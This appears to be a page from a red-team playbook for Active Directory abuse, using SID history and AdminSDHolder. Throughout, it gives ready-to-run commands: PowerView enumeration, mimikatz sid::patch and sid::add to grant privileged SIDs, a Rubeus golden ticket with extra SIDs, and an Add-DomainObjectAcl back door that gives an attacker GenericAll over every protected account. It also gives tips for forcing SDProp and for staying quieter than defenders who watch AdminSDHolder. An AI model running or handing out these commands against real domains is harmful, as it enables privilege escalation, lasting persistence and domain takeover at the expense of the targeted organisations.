# SID history and AdminSDHolder

## SID history: find it
With PowerView loaded, as in :Pb domain-enum:
Get-DomainUser -Properties sidhistory | ?{$_.sidhistory}
Get-DomainGroup -Properties sidhistory | ?{$_.sidhistory}
- [ ] A sidHistory in a forest with one domain: planted persistence, or left from a migration
- [ ] Across domains: a sidHistory that holds the parent domain's privileged SIDs is that privilege, at once

## SID history: use it
- [ ] It takes a domain administrator: mimikatz patches the directory service on the DC itself
At the pwn-broker prompt:
tool install mimikatz
serve
serve files mimikatz
On the DC, with THE-PRIVILEGED-SID such as the parent domain's Enterprise Admins:
- [ ] mimikatz.exe fetched with the line serve files gives
.\mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:<TargetUser> /new:THE-PRIVILEGED-SID" "exit"
The same effect with no change to the account, as extra SIDs in a golden ticket, with Rubeus from tool install rubeus and serve files rubeus, as in :Pb golden-silver:
.\Rubeus.exe golden /rc4:THE-KRBTGT-HASH /domain:<Domain> /sid:<DomainSID> /sids:THE-PRIVILEGED-SID /user:<Username> /ptt
- [ ] SID filtering, on an external or quarantined trust, drops foreign SIDs: the trust's type checked first

## AdminSDHolder: read it
Get-DomainObject -Identity 'CN=AdminSDHolder,CN=System,<BaseDN>' -Properties *
Get-DomainObjectAcl -Identity 'CN=AdminSDHolder,CN=System,<BaseDN>' -ResolveGUIDs
- [ ] Every 60 minutes SDProp copies this ACL onto every protected account: Domain Admins, Enterprise Admins, Schema Admins, the Operators groups and the rest
- [ ] An ACL cleaned on the protected users but not here means the defenders cleaned the wrong place

## AdminSDHolder: a back door
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<BaseDN>' -PrincipalIdentity '<Username>' -Rights All -Verbose
- [ ] Within 60 minutes <Username> has GenericAll on every protected account in the domain
- [ ] Sooner: SDProp started by hand on the PDC emulator, through the rootDSE operation RunProtectAdminGroupsTask

## If it fails
- [ ] sid::add errors: SID filtering, or not enough rights over the account
- [ ] SDProp puts my change back: something watches AdminSDHolder, so an ACL on one protected user that matters, which is quieter: :Pb acl-abuse

## Next
- [ ] A privileged ticket: :Pb dcsync
- [ ] The rest of the ACL edges I found: :Pb acl-abuse
